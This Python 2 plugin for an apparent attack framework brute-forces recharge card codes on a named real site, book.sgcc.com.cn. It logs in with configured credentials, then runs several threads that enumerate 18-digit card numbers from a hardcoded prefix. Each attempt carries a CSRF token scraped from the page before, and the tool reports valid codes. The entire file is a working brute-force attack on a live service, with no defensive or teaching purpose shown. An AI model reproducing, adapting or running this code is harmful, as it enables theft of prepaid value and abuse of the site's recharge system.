import sys
import os
from bs4 import *
import pycurl
import gzip
import StringIO
import re
import urllib2
from bmplugin import *

info={'desc':"shu xiang recharge brute",
      'cve':'',
      'link':''} 

def init_plugin(main): 
    #jenkins=jenkins_unauth()
    booksgcc.main=main
    active=main.maintive
    active.regcommand('sxrecbrute',sxrecharge_brute,"shu xiang recharge brute",__file__)
    
########################################################################
class booksgcc:
    """"""
    #----------------------------------------------------------------------
    main=None
    
    def __init__(self,user=None,passwd=None):
        """Constructor"""
        if user:
            self.user=user
        else:
            self.user=self.main.pcf.getconfig('booksgcc','user')
        if passwd:
            self.passwd=passwd
        else:
            self.passwd=self.main.pcf.getconfig('booksgcc','passwd')
        
        self.objc=lib_http.getpyurl()#proxy="http://127.0.0.1:8088")
        self.falg=0
        
    def islogin(self):
        try:
            head,body=lib_http.getdata4info('http://book.sgcc.com.cn/usercenter/userinfo',objc=self.objc)
        except Exception:
            lib_func.printstr("Time Out in islogin",2)
            return False
        pd=lib_http.parsehttphead(head)
        if pd['code']!='200':
            if pd.has_key('set-cookie'):
                m=re.search(r'JSESSIONID=.+;?',pd['set-cookie'])
                if m:
                    self.objc.setopt(pycurl.COOKIE,m.group())
            return False
        
        return True
    
    def login(self,user=None,passwd=None):
        if user:
            self.user=user
        if passwd:
            self.passwd=passwd
        if self.user=='' or self.passwd=='':
            lib_func.printstr("You should config user and pass in booksgcc segment plugins.ini or input the user and pass")
            return
        if self.islogin():
            return
        lib_func.printstr("login in book.sgcc...")
        postdt="userName=%s&password=%s&captcha=&autoLogin=N&loginName=N&email=" %(self.user,self.passwd)
        self.objc.setopt(pycurl.POSTFIELDS,postdt)
        head,body=lib_http.getdata4info('http://book.sgcc.com.cn/login/loginProcess',objc=self.objc)
        if body[2:6]=='auto':
            lib_func.printstr("login in book.sgcc succfully")
            self.falg=1
        else:
            lib_func.printstr("login in book.sgcc fail")
    
    def recharge_burte(self,prefix,start=1,nums=100000):
        self.login()
        if not self.falg:
            lib_func.printstr("Can't login sgcc",1)
            return
        plen=len(prefix)
        ulen=18-plen
        fs="%0."+str(ulen)+'d'
        csrf=""
        for i in range(1,nums+start):
            suffix=fs %i
            card=prefix+suffix
            postdt="CSRFToken=%s&cardCode=%s" %(csrf,card)
            self.objc.setopt(pycurl.POSTFIELDS,postdt)
            head,body=lib_http.getdata4info("http://book.sgcc.com.cn/usercenter/recharge",objc=self.objc)
            rs=self.getresult(body)
            if rs in ('2','3','4'):
                lib_func.printstr("have a vaild cardcode,this flag is %d" %rs)
            csrf=self.getcsrftoken(body)
            
    def getresult(self,body):
        s=body[23990:24020]
        m=re.search('var result = \'(\d?)\'',s)
        if m:
            return m.groups()[0]
        return ''
    
    def getcsrftoken(self,body):
        s=body[25940:26000]
        m=re.search('value=\"(.+?)\"',s)
        if m:
            return m.groups()[0]
        return ''


def sxrecharge_brute(paras):
    """sxrecbrute [--prefix=prefix] [--start=start] [--end=end] [-t threads] [-u username] [-p passwd]"""
    try:
        pd=lib_func.getparasdict(paras,"t:u:p:",['prefix=','start=','end='])
    except Exception:
        lib_func.printstr(sxrecharge_brute.__doc__,1)
        return
    start=1
    end=10
    user=''
    passwd=''
    prefix="137606994981"
    if pd.has_key('t'):
        threads=int(pd['t'])
    else:
        threads=1
    if pd.has_key('u'):
        user=pd['u']
    if pd.has_key('p'):
        passwd=pd['p']
    if pd.has_key('start'):
        start=int(pd['start'])
    if pd.has_key('end'):
        end=int(pd['end'])
    if pd.has_key('prefix'):
        prefix=pd['prefix']
    import math
    import threading
    nums=int(math.ceil((end-start)/float(threads)))
    books=[booksgcc(user,passwd) for i in range(threads)]
    threadlist=[i for i in range(threads)]
    for i in range(threads):
        threadlist[i]=threading.Thread(target=books[i].recharge_burte,args=(prefix,start+(nums*i),nums))
        lib_func.printstr("thread start from %d to %d" %(start+(nums*i),start+(nums*i)+nums))
        threadlist[i].start()
    
    lib_func.printstr("Wait all thread finish...")
    for thread in threadlist:
        thread.join()
    
